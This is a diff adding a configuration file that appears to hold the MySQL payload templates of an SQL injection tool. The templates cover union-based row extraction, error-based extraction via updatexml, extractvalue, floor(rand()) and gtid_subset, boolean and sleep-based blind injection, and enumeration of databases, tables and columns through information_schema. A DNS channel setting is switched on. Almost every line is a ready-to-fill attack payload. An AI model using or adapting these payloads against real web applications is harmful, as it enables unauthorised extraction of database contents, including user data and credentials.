@@ -1,0 +1,37 @@
+exists_table: exists(select 1 from {table})
+exists_column: exists(select {cols} from {table})
+UnionFillStr:1
+UnionAll:1=2 union all select {cols}
+UnionData:1=2 union all select {cols} from `{db}`.`{table}`{where} limit {rowIndex},1
+UnionDataRows:1=2 union all select {fill} from (select group_concat(sqli_r separator '') sqli_agg from (select {cols} sqli_r from `{db}`.`{table}`{where} limit {rowIndex},{batchSize}) sqli_t) sqli_x
+ErrorData:updatexml(1,concat(0x7e,({cols}),0x7e),1)
+ErrorData@UpdateXml:updatexml(1,concat(0x7e,({cols}),0x7e),1)
+ErrorData@ExtractValue:extractvalue(1,concat(0x7e,({cols}),0x7e))
+ErrorData@FloorRand:(select 1 from (select count(*),concat(0x7e,({cols}),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a)
+ErrorData@GtidSubset:gtid_subset(concat(0x7e,({cols}),0x7e),1)
+BoolData:{expr}>{value}
+DataSplitStr:_s_p_
+DataStartStr:data_
+DataEndStr:_data
+DBCount:(select count(1) from information_schema.schemata)
+TableCount:(select count(1) from information_schema.tables where table_schema={db})
+ColumnCount:(select count(1) from information_schema.columns where table_schema={db} and table_name={table})
+DBName:(select schema_name from information_schema.schemata limit {index},1)
+DBNames:(select group_concat(schema_name) from information_schema.schemata)
+TableName:(select table_name from information_schema.tables where table_schema={db} limit {index},1)
+TableNames:(select group_concat(table_name) from information_schema.tables where table_schema={db})
+ColumnName:(select column_name from information_schema.columns where table_schema={db} and table_name={table} limit {index},1)
+ColumnNames:(select group_concat(column_name) from information_schema.columns where table_schema={db} and table_name={table})
+Substr:substr({expr},{start},{len})
+Concat:concat_ws({split},{startMark},{cols},{endMark})
+Length:char_length({expr})
+Cast:cast({expr} as char)
+IfNull:ifnull({expr},0x20)
+Ascii:ascii({expr})
+Hex:hex({expr})
+DataValue:(select {cols} from `{db}`.`{table}`{where} limit {rowIndex},1)
+DataCount:(select count(1) from `{db}`.`{table}`{where})
+SleepBoolData: (select 1 from (select(sleep({sleep}-(if(({cond}), 0, {sleep}))))){alias})
+ErrorChunkLen:10
+BlindStrategy: ord
+DnsChannel: yes
